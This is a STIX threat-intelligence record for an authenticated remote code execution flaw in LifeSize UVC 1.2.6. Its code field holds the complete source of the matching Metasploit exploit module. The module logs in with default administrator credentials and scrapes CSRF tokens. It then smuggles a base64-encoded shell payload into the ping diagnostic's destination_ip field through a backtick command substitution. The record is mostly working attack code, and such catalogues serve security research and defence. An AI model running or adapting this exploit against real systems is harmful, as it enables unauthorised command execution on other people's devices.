{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--300260e5-00d9-48e7-bc85-deeec5c58e27",
    "created": "2024-08-14T17:03:06.949953Z",
    "modified": "2024-08-14T17:03:06.949957Z",
    "name": "\"LifeSize UVC Authenticated RCE via Ping\"",
    "description": " When authenticated as an administrator on LifeSize UVC 1.2.6, an attacker can abuse the ping diagnostic functionality to achieve remote command execution as the www-data user (or equivalent).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/lifesize_uvc_ping_rce.rb",
            "external_id": "lifesize_uvc_ping_rce.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"LifeSize UVC Authenticated RCE via Ping\",\n      'Description'    => %q{\n      When authenticated as an administrator on LifeSize UVC 1.2.6, an attacker\n      can abuse the ping diagnostic functionality to achieve remote command\n      execution as the www-data user (or equivalent).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Brandon Perry <bperry.volatile[at]gmail.com>' #discovery/metasploit module\n        ],\n      'References'     =>\n        [\n          ['EDB', '32437']\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['LifeSize UVC version <= 1.2.6', {}]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'python'\n            }\n        },\n      'DisclosureDate' => '2014-03-21',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          Opt::RPORT(443),\n          OptBool.new('SSL', [true, 'Use SSL', true]),\n          OptString.new('TARGETURI', [true, 'The URI of the vulnerable instance', '/']),\n          OptString.new('USERNAME', [true, 'The username to authenticate with', 'administrator']),\n          OptString.new('PASSWORD', [true, 'The password to authenticate with', 'admin123'])\n        ])\n  end\n\n  def exploit\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'accounts', 'login/')\n    })\n\n    if !res or !res.body\n      fail_with(Failure::UnexpectedReply, \"Server did not respond in an expected way\")\n    end\n\n    if res.code != 200\n      fail_with(Failure::UnexpectedReply, \"Did not get a 200 response, perhaps the server isn't on an SSL port\")\n    end\n\n    token = /name='csrfmiddlewaretoken' value='(.*)'/.match(res.body)\n\n    if token.length < 2\n      fail_with(Failure::UnexpectedReply, \"Could not find token on page.\")\n    end\n\n    token = token[1]\n\n    post = {\n      'csrfmiddlewaretoken' => token,\n      'username' => datastore['USERNAME'],\n      'password' => datastore['PASSWORD']\n    }\n\n    #referer is required\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'accounts/'),\n      'method' => 'POST',\n      'vars_post' => post,\n      'headers' => {\n        'Referer' => 'https://' + datastore['RHOST'] + '/accounts/'\n      },\n      'cookie' => 'csrftoken=' + token\n    })\n\n    if !res\n      fail_with(Failure::UnexpectedReply, \"Server did not respond in an expected way\")\n    end\n\n    #we want a 302, 200 means we are back at login page\n    if res.code == 200\n      fail_with(Failure::NoAccess, \"Authentication failed. Please check your username and password.\")\n    end\n\n    cookie = res.get_cookies\n\n    new_cookie = 'csrftoken=' + token + '; ' + cookie\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'server-admin', 'operations', 'diagnose', 'ping/'),\n      'cookie' => new_cookie\n    })\n\n    if !res or !res.body\n      fail_with(Failure::UnexpectedReply, \"Server did not respond in an expected way\")\n    end\n\n    token = /name='csrfmiddlewaretoken' value='(.*)'/.match(res.body)\n    token = token[1]\n\n    new_cookie = 'csrftoken=' + token + '; ' + cookie\n\n    pay = 'csrfmiddlewaretoken='+token\n    pay << '&source_ip=' + datastore['RHOST']\n    pay << '&destination_ip=go`echo ' + Rex::Text.encode_base64(payload.encoded) + '|base64 --decode|sh`ogle.com'\n\n    #referer is required\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'server-admin', 'operations', 'diagnose', 'ping/'),\n      'method' => 'POST',\n      'headers' => {\n        'Referer' => 'https://' + datastore['RHOST'] + '/server-admin/operations/diagnose/ping/'\n      },\n      'cookie' => new_cookie,\n      'data' => pay\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-21",
    "x_mitre_platforms": [
        "['unix']"
    ]
}